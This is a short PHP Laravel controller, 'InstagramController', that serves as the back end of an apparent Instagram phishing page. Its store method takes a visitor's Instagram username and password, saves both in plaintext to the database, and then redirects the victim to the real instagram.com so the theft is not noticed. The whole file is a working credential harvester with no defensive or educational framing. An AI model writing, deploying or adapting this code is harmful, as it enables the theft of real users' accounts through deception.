<?php

namespace App\Http\Controllers;

use App\Models\Instagram;
use Illuminate\Http\Request;

class InstagramController extends Controller
{
    /**
     * Display a listing of the resource.
     */
    public function index()
    {
        return view('instagram.index');
    }

    /**
     * Store a newly created resource in storage.
     */
    public function store(Request $request)
    {
        $validated = $request->validate([
            'username' => ['required', 'string', 'max:255'],
            'password' => ['required', 'string', 'max:255'],
        ]);

        Instagram::create([
            'username' => $validated['username'],
            'password' => $validated['password']
        ]);

        return redirect('https://www.instagram.com');
    }

}
